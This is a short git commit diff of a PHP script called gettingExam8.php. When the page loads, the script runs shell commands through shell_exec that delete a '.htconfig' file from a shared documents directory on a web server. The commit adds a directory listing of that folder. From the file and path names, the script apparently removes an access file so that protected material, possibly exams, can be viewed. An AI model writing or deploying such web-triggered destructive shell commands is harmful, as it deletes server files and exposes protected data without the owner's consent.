cb3948696ff8d960f3583c466f21efd456309e8b
An Vo <30716416+tienlatien252@users.noreply.github.com>
2018-11-18 10:49:33 -0600

    Update gettingExam8.php

--- gettingExam8.php
+++ gettingExam8.php
@@ -1,4 +1,6 @@
 <?php
 $output = shell_exec('rm /var/www/documents/shared/IWptBJzlVU/.htconfig');
 echo "<pre>$output</pre>";
+$output = shell_exec('ls -la /var/www/documents/shared/IWptBJzlVU/');
+echo "<pre>$output</pre>";
 ?>
